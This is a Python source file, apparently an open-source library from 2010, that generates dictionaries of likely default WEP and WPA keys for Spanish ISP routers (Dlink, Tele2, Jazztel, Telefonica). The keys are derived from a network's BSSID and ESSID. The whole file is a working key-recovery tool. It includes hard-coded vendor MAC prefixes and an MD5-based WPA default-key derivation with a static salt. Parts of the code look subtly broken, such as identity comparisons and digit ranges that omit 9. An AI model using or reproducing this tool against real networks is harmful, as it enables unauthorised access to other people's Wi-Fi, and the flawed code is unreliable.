#!/usr/bin/env python
"""
    Spanish Dictionary Generators for WEP and WPA Networks library
    I know, I know, this is not PEP8'ized
    This time... fuck PEP8.
 
     Copyright (C) 2010 David Francos Cuartero
        This program is free software; you can redistribute it and/or
        modify it under the terms of the GNU General Public License
        as published by the Free Software Foundation; either version 2
        of the License, or (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program; if not, write to the Free Software
        Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

"""
import sys, string, hashlib

class Dlink():
    def __init__(self, *args):
        if not len(args[0]) > 1:
            self.return_=1
            return
        self.sm=args[0][1].split(':')
        self.dicts=[]
        self.S2=self.hexa_minus_one(self.sm[-1][1])
        self.S1=""
        if self.sm[-1][1] is 0: self.S1=self.hexa_minus_one(self.sm[-1][0])
        if self.S1 is -1: self.S2, self.S1 = [0,0]
        self.static="%s%s%s%s" %(self.sm[4], self.sm[1], self.sm[2],self.sm[3])

    @property
    def dictionary(self):
        if hasattr(self, 'return_'):
            return "Usage: Dlink Bssid "
        for self.F in string.hexdigits.replace('abcdef',''):
            for self.I in string.hexdigits.replace('abcdef',''):
                self.dicts.append("%s%s%s%s%s%s%s%s"
                        %(self.sm[5], self.sm[0], self.static, self.sm[5], self.static, self.sm[1], self.F, self.I))
                self.dicts.append("%s%s%s%s%s%s%s%s%s%s%s" %(
                            self.S1, self.S2, self.sm[0],self.static,
                            self.S1, self.S2, self.sm[5],self.static,self.sm[0], self.F, self.I))
                self.dicts.append("%s%s%s%s%s%s%s%s%s"
                        %(self.S1, self.S2, self.sm[0], self.static, self.sm[5], self.static, self.sm[1], self.F, self.I))

        return self.dicts

    def hexa_minus_one(self, hexa):
        if hex(int(hexa, 16) - 1).split('x')[0] == "-": return -1
        return hex(int(hexa, 16) - 1).split('x')[1]

class Tele2():
    def __init__(self, *args):
        if not len(args[0]) > 1:
            self.return_=1
            return
        self.sm=args[0][1].split(':')
        self.year=args[0][1]
        self.dicts=[]
        self.fixed="IX1V" + args[0][2]

    @property
    def dictionary(self):
        if hasattr(self, 'return_'):
            return "Usage: Tele2 year fixed_data [''|'IV']"
        [[[[[[ self.dicts.append("%s%s%s%s%s%s%s%s" %(self.fixed, self.year, a, b, c, d, e, f) ) for a in range(0,9)] for b in range(0,9)] for c in range(0,9)] for d in range(0,9)] for e in range(0,9)] for f in range(0,9)]
        return self.dicts

class Jazztel():
    def __init__(self, *args):
        if not len(args[0]) > 1:
            self.dictionary="Usage: Jazztel Bssid Essid [WPA]"
            return
        if args[0][3] is "WPA":
            self.dictionary=JazztelAndTelefonicaWPA(args).dictionary
        else:
            self.dictionary=JazztelAndTelefonica(args[0][1], args[0][2], { '00:1A:2B' : ['Comtrend', 'E001D20'] } ).dictionary

class Telefonica():
    def __init__(self, *args):
        if not len(args[0]) > 1:
            self.dictionary="Usage: Telefonica Bssid Essid"
            return

        self.dictionary=JazztelAndTelefonica(args[0][1], args[0][2], {
            "00:60:B3": [ "Z-com", "Z001349"],
            "00:01:38": [ "Xavi 7768r", "X000138"] ,
            "00:03:C9": [ "Comtrend 535", "C0030DA"],
            "00:A0:C5": [ "Zyxel 650HW/660HW", "Z001349"],
            "00:16:38": [ "Comtrend_536+", "C0030DA"],
            "00:1A:2B": [ "Comtrend 5361", "C001D20"],
            "00:02:CF": [ "P-660HW-D1", "Z0002CF" ],
            "00:23:F8": [ "P-660HW-D1", "Z0023F8"],
            "00:13:49": [ "P-660HW-D1", "Z001349", "Z0002CF" ] }).dictionary

class TelefonicaWPA():
    def __init__(self, *args):
        if not len(args[0]) > 1:
            self.dictionary="Usage: TelefonicaWPA Bssid Essid"
            return

        self.dictionary=JazztelAndTelefonicaWPA(args[0][2], args[0][1]).dictionary

class JazztelWPA():
    def __init__(self, *args):
        if not len(args[0]) > 1:
            self.dictionary="Usage: JazztelWPA Bssid Essid"
            return

        self.dictionary=JazztelAndTelefonicaWPA(args[0][2], args[0][1]).dictionary

class JazztelAndTelefonicaWPA():
    def __init__(self, *args):
        if not len(args[0]) > 1:
            self.return_=1
            return
        self.mac=args[0].replace(':','')
        self.essid=args[0].split("_")[1]
        self.static="bcgbghgg"

    @property
    def dictionary(self):
        if hasattr(self, 'return_'):
            return
        return [hashlib.md5(self.static + self.mac[:-4] + self.essid + self.mac).hexdigest()[:-12], ]

class JazztelAndTelefonica():
    def __init__(self, *args):
        if not len(args[0]) > 1:
            self.return_=1
            return
        self.sm=args[0].split(':')
        self.essid=args[1]
        self.dicts=[]
        self.valid_routers=args[2]

    @property
    def dictionary(self):
        if hasattr(self, 'return_'):
            return
        a=string.hexdigits.replace('abcdef','')
        try:
            for i in range(1, len(self.valid_routers[':'.join(self.sm[:3])])):
                [[[[ self.dicts.append( "%s%s%s%s%s%s%s"
                    %(self.valid_routers[':'.join(self.sm[:3])][i], \
                     m, j, k, l, self.essid[-2], self.essid[-1])) for m in a]
                        for j in a ] for k in a ] for l in a]
        except KeyError:
            raise Exception('Error: Router not valid for a jazztel or telefonica network')

        return self.dicts
